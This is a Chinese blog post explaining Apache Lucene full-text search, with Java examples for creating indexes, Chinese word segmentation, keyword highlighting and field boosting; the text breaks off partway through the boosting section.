<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Lucene介绍与使用 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Lucene介绍与使用" />
<meta property="og:description" content="目录
Lucene
全文检索
全文检索的应用场景
索引
Lucene、Solr、Elasticsearch
三者关系
Lucene的基本使用
lucene工作流程
构建索引
查询索引
创建索引的详细流程
案例演示
生成索引：
中文分词索引
高亮显示
文档域加权
概述：
案例演示
查询索引的详细流程
索引的删除修改
删除索引
deleteDocBeforeMerge 此方法只标记未删除索引
修改索引
高级查询
特定项查询
综合案例演示
查询
删除
修改
添加 Lucene Lucene是一套用于全文检索和搜寻的开源程序库，由Apache软件基金会支持和提供Lucene提供了一个简单却强大的应用程序接口（API），能够做全文索引和搜寻，在Java开发环境里Lucene是一个成熟的免费开放源代码工具Lucene并不是现成的搜索引擎产品，但可以用来制作搜索引擎产品 官网：http://lucene.apache.org
全文检索 全文检索大体分两个过程，索引创建 (Indexing) 和搜索索引 (Search) 。
索引创建：将现实世界中所有的结构化和非结构化数据提取信息，创建索引的过程。搜索索引：就是得到用户的查询请求，搜索创建的索引，然后返回结果的过程 全文检索的应用场景 搜索引擎 百度、谷歌、搜索等等站内搜索 论坛搜索，微博搜索，文章搜索电商搜索 jd，tb搜索 索引 索引：一个为了提高查询速度，创建某种数据结构的集合
1、数据的分类：
1、结构化数据：格式、长度、数据类型固定
例如数据库的数据，
2、非结构化数据：格式、长度、数据类型不固定
word文档、pdf文档等等
2、数据的查询
1、结构化数据的查询：sql语句
简单、查询速度快
2、非结构化数据：查询某个关键字
条件复杂，查询难度大
顺序扫描法
字符串匹配（顺序扫描）
使非结构化的数据变为结构化的数据便于查询
Lucene、Solr、Elasticsearch 公司中使用的搜索技术是solr和Elasticsearch，而在这里介绍lucene是因为其简单对于新手来说入门容易solr 分词索引的数据库(有服务器的概念) 分词索引，能够支撑大数据量的索引 ​Elasticsearch分词索引的数据库(有服务器的概念) 分词索引，能够支撑更大数据量的索引 ​ 能够搭建ES集群 三者关系 Lucene：底层的API，工具包" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/1195145a71f324fdec461cea1b3fe2e5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-05-08T00:13:47+08:00" />
<meta property="article:modified_time" content="2022-05-08T00:13:47+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Lucene介绍与使用</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="Lucene-toc" style="margin-left:0px;"><a href="#Lucene" rel="nofollow">Lucene</a></p> 
<p id="%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2-toc" style="margin-left:40px;"><a href="#%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2" rel="nofollow">全文检索</a></p> 
<p id="%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF-toc" style="margin-left:80px;"><a href="#%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF" rel="nofollow">全文检索的应用场景</a></p> 
<p id="%E7%B4%A2%E5%BC%95-toc" style="margin-left:40px;"><a href="#%E7%B4%A2%E5%BC%95" rel="nofollow">索引</a></p> 
<p id="Lucene%E3%80%81Solr%E3%80%81Elasticsearch-toc" style="margin-left:80px;"><a href="#Lucene%E3%80%81Solr%E3%80%81Elasticsearch" rel="nofollow">Lucene、Solr、Elasticsearch</a></p> 
<p id="%E4%B8%89%E8%80%85%E5%85%B3%E7%B3%BB-toc" style="margin-left:80px;"><a href="#%E4%B8%89%E8%80%85%E5%85%B3%E7%B3%BB" rel="nofollow">三者关系</a></p> 
<p id="Lucene%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8-toc" style="margin-left:0px;"><a href="#Lucene%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8" rel="nofollow">Lucene的基本使用</a></p> 
<p id="lucene%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B-toc" style="margin-left:40px;"><a href="#lucene%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B" rel="nofollow">lucene工作流程</a></p> 
<p id="%C2%A0%E6%9E%84%E5%BB%BA%E7%B4%A2%E5%BC%95-toc" style="margin-left:80px;"><a href="#%C2%A0%E6%9E%84%E5%BB%BA%E7%B4%A2%E5%BC%95" rel="nofollow"> 构建索引</a></p> 
<p id="%E6%9F%A5%E8%AF%A2%E7%B4%A2%E5%BC%95-toc" style="margin-left:80px;"><a href="#%E6%9F%A5%E8%AF%A2%E7%B4%A2%E5%BC%95" rel="nofollow">查询索引</a></p> 
<p id="%E5%88%9B%E5%BB%BA%E7%B4%A2%E5%BC%95%E7%9A%84%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B-toc" style="margin-left:40px;"><a href="#%E5%88%9B%E5%BB%BA%E7%B4%A2%E5%BC%95%E7%9A%84%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B" rel="nofollow">创建索引的详细流程</a></p> 
<p id="%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA-toc" style="margin-left:40px;"><a href="#%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA" rel="nofollow">案例演示</a></p> 
<p id="%E7%94%9F%E6%88%90%E7%B4%A2%E5%BC%95%EF%BC%9A-toc" style="margin-left:80px;"><a href="#%E7%94%9F%E6%88%90%E7%B4%A2%E5%BC%95%EF%BC%9A" rel="nofollow">生成索引：</a></p> 
<p id="%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E7%B4%A2%E5%BC%95-toc" style="margin-left:80px;"><a href="#%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E7%B4%A2%E5%BC%95" rel="nofollow">中文分词索引</a></p> 
<p id="%E9%AB%98%E4%BA%AE%E6%98%BE%E7%A4%BA-toc" style="margin-left:40px;"><a href="#%E9%AB%98%E4%BA%AE%E6%98%BE%E7%A4%BA" rel="nofollow">高亮显示</a></p> 
<p id="%E6%96%87%E6%A1%A3%E5%9F%9F%E5%8A%A0%E6%9D%83-toc" style="margin-left:40px;"><a href="#%E6%96%87%E6%A1%A3%E5%9F%9F%E5%8A%A0%E6%9D%83" rel="nofollow">文档域加权</a></p> 
<p id="%E6%A6%82%E8%BF%B0%EF%BC%9A-toc" style="margin-left:80px;"><a href="#%E6%A6%82%E8%BF%B0%EF%BC%9A" rel="nofollow">概述：</a></p> 
<p id="%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA-toc" style="margin-left:80px;"><a href="#%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA" rel="nofollow">案例演示</a></p> 
<p id="%E6%9F%A5%E8%AF%A2%E7%B4%A2%E5%BC%95%E7%9A%84%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B-toc" style="margin-left:40px;"><a href="#%E6%9F%A5%E8%AF%A2%E7%B4%A2%E5%BC%95%E7%9A%84%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B" rel="nofollow">查询索引的详细流程</a></p> 
<p id="%E7%B4%A2%E5%BC%95%E7%9A%84%E5%88%A0%E9%99%A4%E4%BF%AE%E6%94%B9-toc" style="margin-left:40px;"><a href="#%E7%B4%A2%E5%BC%95%E7%9A%84%E5%88%A0%E9%99%A4%E4%BF%AE%E6%94%B9" rel="nofollow">索引的删除修改</a></p> 
<p id="%E5%88%A0%E9%99%A4%E7%B4%A2%E5%BC%95-toc" style="margin-left:80px;"><a href="#%E5%88%A0%E9%99%A4%E7%B4%A2%E5%BC%95" rel="nofollow">删除索引</a></p> 
<p id="deleteDocBeforeMerge%20%E6%AD%A4%E6%96%B9%E6%B3%95%E5%8F%AA%E6%A0%87%E8%AE%B0%E6%9C%AA%E5%88%A0%E9%99%A4%E7%B4%A2%E5%BC%95-toc" style="margin-left:80px;"><a href="#deleteDocBeforeMerge%20%E6%AD%A4%E6%96%B9%E6%B3%95%E5%8F%AA%E6%A0%87%E8%AE%B0%E6%9C%AA%E5%88%A0%E9%99%A4%E7%B4%A2%E5%BC%95" rel="nofollow">deleteDocBeforeMerge 此方法只标记未删除索引</a></p> 
<p id="%E4%BF%AE%E6%94%B9%E7%B4%A2%E5%BC%95-toc" style="margin-left:80px;"><a href="#%E4%BF%AE%E6%94%B9%E7%B4%A2%E5%BC%95" rel="nofollow">修改索引</a></p> 
<p id="%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2-toc" style="margin-left:40px;"><a href="#%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2" rel="nofollow">高级查询</a></p> 
<p id="%E7%89%B9%E5%AE%9A%E9%A1%B9%E6%9F%A5%E8%AF%A2-toc" style="margin-left:40px;"><a href="#%E7%89%B9%E5%AE%9A%E9%A1%B9%E6%9F%A5%E8%AF%A2" rel="nofollow">特定项查询</a></p> 
<p id="%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA-toc" style="margin-left:0px;"><a href="#%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA" rel="nofollow">综合案例演示</a></p> 
<p id="%E6%9F%A5%E8%AF%A2-toc" style="margin-left:40px;"><a href="#%E6%9F%A5%E8%AF%A2" rel="nofollow">查询</a></p> 
<p id="%C2%A0%E5%88%A0%E9%99%A4-toc" style="margin-left:40px;"><a href="#%C2%A0%E5%88%A0%E9%99%A4" rel="nofollow"> 删除</a></p> 
<p id="%C2%A0%E4%BF%AE%E6%94%B9-toc" style="margin-left:40px;"><a href="#%C2%A0%E4%BF%AE%E6%94%B9" rel="nofollow"> 修改</a></p> 
<p id="%C2%A0%E6%B7%BB%E5%8A%A0%C2%A0-toc" style="margin-left:40px;"><a href="#%C2%A0%E6%B7%BB%E5%8A%A0%C2%A0" rel="nofollow"> 添加 </a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="Lucene">Lucene</h2> 
<blockquote> 
 <ul><li>Lucene是一套用于全文检索和搜寻的开源程序库，由Apache软件基金会支持和提供</li><li>Lucene提供了一个简单却强大的应用程序接口（API），能够做全文索引和搜寻，在Java开发环境里Lucene是一个成熟的免费开放源代码工具</li><li>Lucene并不是现成的搜索引擎产品，但可以用来制作搜索引擎产品</li></ul> 
 <p></p> 
 <p>官网：<a class="link-info" href="http://lucene.apache.org" rel="nofollow" title="http://lucene.apache.org">http://lucene.apache.org</a></p> 
</blockquote> 
<p></p> 
<h3 id="%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2"><strong>全文检索</strong></h3> 
<p><img alt="" height="671" src="https://images2.imgbox.com/d4/c2/GqIpXUp7_o.png" width="1200"></p> 
<blockquote> 
 <p> 全文检索大体分两个过程，<strong>索引创建</strong> <strong>(Indexing)</strong> 和<strong>搜索索引</strong> <strong>(Search)</strong> 。</p> 
 <ul><li><strong>索引创建</strong>：将现实世界中所有的结构化和非结构化数据提取信息，创建索引的过程。</li><li><strong>搜索索引</strong>：就是得到用户的查询请求，搜索创建的索引，然后返回结果的过程</li></ul> 
</blockquote> 
<h4 id="%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><strong>全文检索的应用场景</strong></h4> 
<blockquote> 
 <ul><li>搜索引擎 
   <ul><li>百度、谷歌、搜索等等</li></ul></li><li>站内搜索 
   <ul><li>论坛搜索，微博搜索，文章搜索</li></ul></li><li>电商搜索 
   <ul><li>jd，tb搜索</li></ul></li></ul> 
</blockquote> 
<h4></h4> 
<h3 id="%E7%B4%A2%E5%BC%95">索引</h3> 
<p><strong>索引</strong>：<strong>一个为了提高查询速度，创建某种数据结构的集合</strong></p> 
<blockquote> 
 <p><strong>1、数据的分类：</strong></p> 
 <p>        1、结构化数据：格式、长度、数据类型固定</p> 
 <p>                 例如数据库的数据，</p> 
 <p>       2、非结构化数据：格式、长度、数据类型不固定<br>                   word文档、pdf文档等等<br><strong>2、数据的查询</strong><br>         1、结构化数据的查询：sql语句<br>         简单、查询速度快<br>         2、非结构化数据：查询某个关键字<br>                 <strong>条件复杂，查询难度大</strong><br>                 顺序扫描法<br>                 字符串匹配（顺序扫描）<br>                 使非结构化的数据变为结构化的数据便于查询</p> 
</blockquote> 
<p></p> 
<h4 id="Lucene%E3%80%81Solr%E3%80%81Elasticsearch">Lucene、Solr、Elasticsearch</h4> 
<blockquote> 
 <ul><li>公司中使用的搜索技术是solr和Elasticsearch，而在这里介绍lucene是因为其简单对于新手来说入门容易</li><li>solr 分词索引的<strong>数据库</strong>(有服务器的概念) 分词索引，能够支撑大数据量的索引 ​</li><li><strong>Elasticsearch</strong>分词索引的<strong>数据库</strong>(有服务器的概念) 分词索引，能够支撑更大数据量的索引 ​ 能够搭建ES集群</li></ul> 
</blockquote> 
<h4></h4> 
<h4 id="%E4%B8%89%E8%80%85%E5%85%B3%E7%B3%BB">三者关系</h4> 
<blockquote> 
 <p><strong>Lucene：</strong>底层的API，工具包</p> 
 <p><strong>Solr/Elasticsearch：</strong>基于Lucene开发的企业级的搜索引擎产品</p> 
</blockquote> 
<h3></h3> 
<h2 id="Lucene%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><strong>Lucene的基本使用</strong></h2> 
<p>使用Lucene的API来实现对索引的增（创建索引）、删（删除索引）、改（修改索引）、查（搜索数据）</p> 
<p></p> 
<h3 id="lucene%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B">lucene工作流程</h3> 
<p><img alt="" height="680" src="https://images2.imgbox.com/e9/be/jmPlMwhB_o.png" width="1200"></p> 
<h4 id="%C2%A0%E6%9E%84%E5%BB%BA%E7%B4%A2%E5%BC%95"> 构建索引</h4> 
<p>把数据库中的数据用IndexWriter（索引写出器类）生成Document对象，存到指定的文件夹或硬盘下，生成的文件就是Lucene文件</p> 
<p></p> 
<h4 id="%E6%9F%A5%E8%AF%A2%E7%B4%A2%E5%BC%95"><br> 查询索引</h4> 
<p>        先获取IndexSearcher对象，从索引文件夹快速检索出想要查询的数据===》查询索引</p> 
<p>        最终读到去TopDocs中</p> 
<p></p> 
<blockquote> 
 <p><strong>注：</strong></p> 
 <ul><li>IndexSearcher 借助于Query对象和IndexReader（索引读取类）对象</li><li>Query(查询对象，包含要查询的关键词信息) 借助于QueryParser查询解析器对象</li><li>QueryParser查询解析对象又要借助于Analyzer解析器</li><li>Analyzer解析器默认只能解析英文需要导入jar包才能解析中文</li></ul> 
</blockquote> 
<p></p> 
<p></p> 
<h3 id="%E5%88%9B%E5%BB%BA%E7%B4%A2%E5%BC%95%E7%9A%84%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B">创建索引的详细流程</h3> 
<p><img alt="" height="464" src="https://images2.imgbox.com/88/2a/OdmRrmbd_o.png" width="1192"></p> 
<p></p> 
<p> <strong>1、文档Document：</strong>数据库中一条具体的记录（在这里我使用的是读取本地的text文件，实际中使用的是数据库中查询出的数据添加到Document对象中）</p> 
<p></p> 
<p><strong> 2、字段Field</strong>：数据库中的每个字段</p> 
<p>一个Document中可以有很多个不同的字段，每一个字段都是一个Field类的对象。</p> 
<blockquote> 
 <ul><li>DoubleField、FloatField、IntField、LongField、StringField这些子类一定会被创建索引，但是不会被分词，而且不一定会被存储到文档列表。要通过构造函数中的参数Store来指定：如果Store.YES代表存储，Store.NO代表不存储<br>  </li><li>TextField即创建索引，又会被分词。StringField会创建索引，但是不会被分词，如果不分词，会造成整个字段作为一个词条，除非用户完全匹配，否则搜索不到</li></ul> 
</blockquote> 
<p></p> 
<p><strong>3、目录对象Directory</strong>：指定索引要存储的位置</p> 
<p>索引存储方式有两种</p> 
<blockquote> 
 <p><strong>1、FSDirectory：</strong>文件系统目录，会把索引库指向本地磁盘。</p> 
 <p><strong>2、RAMDirectory：</strong>内存目录，会把索引库保存在内存</p> 
</blockquote> 
<p><strong>区别：</strong></p> 
<blockquote> 
 <p><strong>FSDirectory： </strong>速度略慢，但是比较安全<br><strong>RAMDirectory：</strong>速度快，但是不安全</p> 
</blockquote> 
<p></p> 
<p><strong>4、Analyzer（分词器类）：</strong>提供分词算法，可以把文档中的数据按照算法分词</p> 
<p>在这里使用的是<strong>StandardAnalyzer</strong>分词器，默认英文分词，不可以中文分词，需要引入中文分词依赖，才可以进行中文分词，一般我们用IK分词器</p> 
<p></p> 
<p></p> 
<h3 id="%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA">案例演示</h3> 
<p><span style="color:#fe2c24;">在以下案例演示中，确保索引文件在测试之前删掉上一次生成的索引文件</span></p> 
<p><strong>主要代码：</strong></p> 
<pre><code class="language-java">public static void main(String[] args) {
//		索引文件将要存放的位置
		String indexDir = "D:\\software\\mysql\\data";
//		数据源地址
		String dataDir = "D:\\software\\mysql\\data\\d";
		IndexCreate ic = null;
		try {
			ic = new IndexCreate(indexDir);
			long start = System.currentTimeMillis();
			int num = ic.index(dataDir);
			long end = System.currentTimeMillis();
			System.out.println("检索指定路径下"+num+"个文件，一共花费了"+(end-start)+"毫秒");
		} catch (Exception e) {
			e.printStackTrace();
		}finally {
			try {
				ic.closeIndexWriter();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}</code></pre> 
<p><strong>封装方法：</strong></p> 
<pre><code class="language-java">/**
	 * 1、构造方法 实例化IndexWriter
	 * @param indexDir
	 * @throws Exception
	 */
	public IndexCreate(String indexDir) throws Exception{
//		获取索引文件的存放地址对象
		FSDirectory dir = FSDirectory.open(Paths.get(indexDir));
//		标准分词器（针对英文）
		Analyzer analyzer = new StandardAnalyzer();
//		索引输出流配置对象
		IndexWriterConfig conf = new IndexWriterConfig(analyzer); 
		indexWriter = new IndexWriter(dir, conf);
	}
	
	/**
	 * 2、关闭索引输出流
	 * @throws Exception
	 */
	public void closeIndexWriter()  throws Exception{
		indexWriter.close();
	}
	
	/**
	 * 3、索引指定路径下的所有文件
	 * @param dataDir
	 * @return
	 * @throws Exception
	 */
	public int index(String dataDir) throws Exception{
		File[] files = new File(dataDir).listFiles();
		//检索文件夹中源文件,并已生成Document对象存储到索引文件中
		for (File file : files) {
			indexFile(file);
		}
		return indexWriter.numDocs();
	}
	
	/**
	 * 4、索引指定的文件
	 * @param file
	 * @throws Exception
	 */
	private void indexFile(File file) throws Exception{
		System.out.println("被索引文件的全路径："+file.getCanonicalPath());
		Document doc = getDocument(file);
		indexWriter.addDocument(doc);
	}
	
	/**
	 * 5、获取文档（索引文件中包含的重要信息，key-value的形式）
	 * @param file
	 * @return
	 * @throws Exception
	 */
	private Document getDocument(File file) throws Exception{
		Document doc = new Document();
		doc.add(new TextField("contents", new FileReader(file)));
//		Field.	Store.YES是否存储到硬盘
		doc.add(new TextField("fullPath", file.getCanonicalPath(),Field.Store.YES));
		doc.add(new TextField("fileName", file.getName(),Field.Store.YES));
		return doc;
	}</code></pre> 
<p></p> 
<h4 id="%E7%94%9F%E6%88%90%E7%B4%A2%E5%BC%95%EF%BC%9A"><strong>生成索引：</strong></h4> 
<p><strong>元数据文件：（<span style="color:#fe2c24;">注：此案例使用以下文件，实际中使用的是数据库查询的数据</span>）</strong></p> 
<p><img alt="" height="333" src="https://images2.imgbox.com/8e/fc/2iiXraYg_o.png" width="833"></p> 
<p></p> 
<p><strong>索引文件：</strong></p> 
<p><img alt="" height="297" src="https://images2.imgbox.com/8b/75/cGx4SiwK_o.png" width="832"></p> 
<p></p> 
<p>使用工具查看索引文件 luke-5.3.0-luke-release</p> 
<p><img alt="" height="686" src="https://images2.imgbox.com/80/f8/CfSmVZoJ_o.png" width="1200"></p> 
<p></p> 
<p></p> 
<h4 id="%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E7%B4%A2%E5%BC%95"><strong>中文分词索引</strong></h4> 
<p>以上是默认的英文分词，也只能英文分词，不支持中文分词。实际中我们不可能只对英文分词，这样我们需要引入第三方的分词器。</p> 
<p>在这里我使用的是<strong>SmartChineseAnalyzer 中文分词器(</strong>org.apache.lucene.analysis.cn.smart.SmartChineseAnalyzer.SmartChineseAnalyzer()<strong>)</strong></p> 
<pre><code class="language-java">	private Integer ids[] = { 1, 2, 3 };
	private String citys[] = { "青岛", "南京", "上海" };
	// private String descs[]={
	// "青岛是个美丽的城市。",
	// "南京是个有文化的城市。",
	// "上海市个繁华的城市。"
	// };
	private String descs[] = { "青岛是个美丽的城市。",
			"南京是一个文化的城市南京，简称宁，是江苏省会，地处中国东部地区，长江下游，濒江近海。全市下辖11个区，总面积6597平方公里，2013年建成区面积752.83平方公里，常住人口818.78万，其中城镇人口659.1万人。[1-4] “江南佳丽地，金陵帝王州”，南京拥有着6000多年文明史、近2600年建城史和近500年的建都史，是中国四大古都之一，有“六朝古都”、“十朝都会”之称，是中华文明的重要发祥地，历史上曾数次庇佑华夏之正朔，长期是中国南方的政治、经济、文化中心，拥有厚重的文化底蕴和丰富的历史遗存。[5-7] 南京是国家重要的科教中心，自古以来就是一座崇文重教的城市，有“天下文枢”、“东南第一学”的美誉。截至2013年，南京有高等院校75所，其中211高校8所，仅次于北京上海；国家重点实验室25所、国家重点学科169个、两院院士83人，均居中国第三。[8-10]",
			"上海市个繁华的城市。" };

	private FSDirectory dir;

	/**
	 * 每次都生成索引文件
	 * 
	 * @throws Exception
	 */
	@Before
	public void setUp() throws Exception {
		dir = FSDirectory.open(Paths.get("D:\\software\\mysql\\data"));
		IndexWriter indexWriter = getIndexWriter();
		for (int i = 0; i &lt; ids.length; i++) {
			Document doc = new Document();
			doc.add(new IntField("id", ids[i], Field.Store.YES));
			doc.add(new StringField("city", citys[i], Field.Store.YES));
			doc.add(new TextField("desc", descs[i], Field.Store.YES));
			indexWriter.addDocument(doc);
		}
		indexWriter.close();
	}

	/**
	 * 获取索引输出流
	 * 
	 * @return
	 * @throws Exception
	 */
	private IndexWriter getIndexWriter() throws Exception {
//		Analyzer analyzer = new StandardAnalyzer();
		Analyzer analyzer = new SmartChineseAnalyzer();
		IndexWriterConfig conf = new IndexWriterConfig(analyzer);
		return new IndexWriter(dir, conf);
	}

	/**
	 * luke查看索引生成
	 * 
	 * @throws Exception
	 */
	@Test
	public void testIndexCreate() throws Exception {

	}

	/**
	 * 测试高亮
	 * 
	 * @throws Exception
	 */
	@Test
	public void testHeight() throws Exception {
		IndexReader reader = DirectoryReader.open(dir);
		IndexSearcher searcher = new IndexSearcher(reader);

		SmartChineseAnalyzer analyzer = new SmartChineseAnalyzer();
		QueryParser parser = new QueryParser("desc", analyzer);
		// Query query = parser.parse("南京文化");
		Query query = parser.parse("南京文明");
		TopDocs hits = searcher.search(query, 100);

		// 查询得分项
		QueryScorer queryScorer = new QueryScorer(query);
		// 得分项对应的内容片段
		SimpleSpanFragmenter fragmenter = new SimpleSpanFragmenter(queryScorer);
		// 高亮显示的样式
		SimpleHTMLFormatter htmlFormatter = new SimpleHTMLFormatter("&lt;span color='red'&gt;&lt;b&gt;", "&lt;/b&gt;&lt;/span&gt;");
		// 高亮显示对象
		Highlighter highlighter = new Highlighter(htmlFormatter, queryScorer);
		// 设置需要高亮显示对应的内容片段
		highlighter.setTextFragmenter(fragmenter);

		for (ScoreDoc scoreDoc : hits.scoreDocs) {
			Document doc = searcher.doc(scoreDoc.doc);
			String desc = doc.get("desc");
			if (desc != null) {
				// tokenstream是从doucment的域（field)中抽取的一个个分词而组成的一个数据流，用于分词。
				TokenStream tokenStream = analyzer.tokenStream("desc", new StringReader(desc));
				System.out.println("高亮显示的片段：" + highlighter.getBestFragment(tokenStream, desc));
			}
			System.out.println("所有内容：" + desc);
		}

	}</code></pre> 
<p></p> 
<p><strong>未使用之前</strong></p> 
<p><img alt="" height="733" src="https://images2.imgbox.com/46/78/dmWD4snu_o.png" width="288"></p> 
<p><strong> 使用之后</strong></p> 
<p> <img alt="" height="697" src="https://images2.imgbox.com/3d/3d/krzWhpKk_o.png" width="280"></p> 
<p> <span style="color:#fe2c24;">这就是中文分词器的作用，不仅仅只对中文分词，还可以进行英文分词</span></p> 
<p></p> 
<p></p> 
<h3 id="%E9%AB%98%E4%BA%AE%E6%98%BE%E7%A4%BA">高亮显示</h3> 
<p>在中文分词下，有出现了一个高亮显示的一个概念。</p> 
<p><span style="color:#fe2c24;"><strong>高亮显示就是给所有关键字加上一个HTML标签</strong></span></p> 
<p><img alt="" height="571" src="https://images2.imgbox.com/8a/9f/ay9T9hUf_o.png" width="838"></p> 
<p></p> 
<p>上图，搜索<strong>java入门基础知识 ，</strong>把查询出来的所有数据中的java入门设置了一个样式,这就是高亮显示</p> 
<p></p> 
<p><strong>查询结果：</strong></p> 
<pre><code class="language-html">高亮显示的片段：城镇人口659.1万人。[1-4] “江南佳丽地，金陵帝王州”，&lt;span color='red'&gt;&lt;b&gt;南京&lt;/b&gt;&lt;/span&gt;拥有着6000多年&lt;span color='red'&gt;&lt;b&gt;文明&lt;/b&gt;&lt;/span&gt;史、近2600年建城史和近500年的建都史，是中国四大古都之一，有“六朝古都”、“十朝都会”之称，是中华&lt;span color='red'&gt;&lt;b&gt;文明&lt;/b&gt;&lt;/span&gt;的
所有内容：南京是一个文化的城市南京，简称宁，是江苏省会，地处中国东部地区，长江下游，濒江近海。全市下辖11个区，总面积6597平方公里，2013年建成区面积752.83平方公里，常住人口818.78万，其中城镇人口659.1万人。[1-4] “江南佳丽地，金陵帝王州”，南京拥有着6000多年文明史、近2600年建城史和近500年的建都史，是中国四大古都之一，有“六朝古都”、“十朝都会”之称，是中华文明的重要发祥地，历史上曾数次庇佑华夏之正朔，长期是中国南方的政治、经济、文化中心，拥有厚重的文化底蕴和丰富的历史遗存。[5-7] 南京是国家重要的科教中心，自古以来就是一座崇文重教的城市，有“天下文枢”、“东南第一学”的美誉。截至2013年，南京有高等院校75所，其中211高校8所，仅次于北京上海；国家重点实验室25所、国家重点学科169个、两院院士83人，均居中国第三。[8-10]
</code></pre> 
<p></p> 
<h3 id="%E6%96%87%E6%A1%A3%E5%9F%9F%E5%8A%A0%E6%9D%83">文档域加权</h3> 
<h4 id="%E6%A6%82%E8%BF%B0%EF%BC%9A">概述：</h4> 
<p>但是在这里大家有没有发现我查询的数据，前几条都是广告，那是为什么这些广告会排在前面让我们第一眼就看到这些广告呢？</p> 
<p>大家肯定说是因为广告投的钱多，所以排在前面。</p> 
<p>在这里，说的是没错，但是在lucene中，把这种技术叫做<strong>文档域加权</strong></p> 
<p></p> 
<h4>案例演示</h4> 
<pre><code class="language-java">private String ids[]={"1","2","3","4"};
	private String authors[]={"Jack","Marry","John","Json"};
	private String positions[]={"accounting","technician","salesperson","boss"};
	private String titles[]={"Java is a good language.","Java is a cross platform language","Java powerful","You should learn java"};
	private String contents[]={
			"If possible, use the same JRE major version at both index and search time.",
			"When upgrading to a different JRE major version, consider re-indexing. ",
			"Different JRE major versions may implement different versions of Unicode,",
			"For example: with Java 1.4, `LetterTokenizer` will split around the character U+02C6,"
	};
	
	private Directory dir;//索引文件目录

	@Before
	public void setUp()throws Exception {
		dir = FSDirectory.open(Paths.get("D:\\software\\mysql\\data"));
		IndexWriter writer = getIndexWriter();
		for (int i = 0; i &lt; authors.length; i++) {
			Document doc = new Document();
			doc.add(new StringField("id", ids[i], Field.Store.YES));
			doc.add(new StringField("author", authors[i], Field.Store.YES));
			doc.add(new StringField("position", positions[i], Field.Store.YES));
			
			TextField textField = new TextField("title", titles[i], Field.Store.YES);
			
//			Json投钱做广告，把排名刷到第一了
			if("boss".equals(positions[i])) {
				textField.setBoost(2f);//设置权重，默认为1
			}
			
			doc.add(textField);
//			TextField会分词，StringField不会分词
			doc.add(new TextField("content", contents[i], Field.Store.NO));
			writer.addDocument(doc);
		}
		writer.close();
		
	}

	private IndexWriter getIndexWriter() throws Exception{
		Analyzer analyzer = new StandardAnalyzer();
		IndexWriterConfig conf = new IndexWriterConfig(analyzer);
		return new IndexWriter(dir, conf);
	}
	
	@Test
	public void index() throws Exception{
		IndexReader reader = DirectoryReader.open(dir);
		IndexSearcher searcher = new IndexSearcher(reader);
		String fieldName = "title";
		String keyWord = "java";
		Term t = new Term(fieldName, keyWord);
		Query query = new TermQuery(t);
		TopDocs hits = searcher.search(query, 10);
		System.out.println("关键字：‘"+keyWord+"’命中了"+hits.totalHits+"次");
		for (ScoreDoc scoreDoc : hits.scoreDocs) {
			Document doc = searcher.doc(scoreDoc.doc);
			System.out.println(doc.get("author"));
		}
	}</code></pre> 
<blockquote> 
 <p>if("boss".equals(positions[i])) {<!-- --></p> 
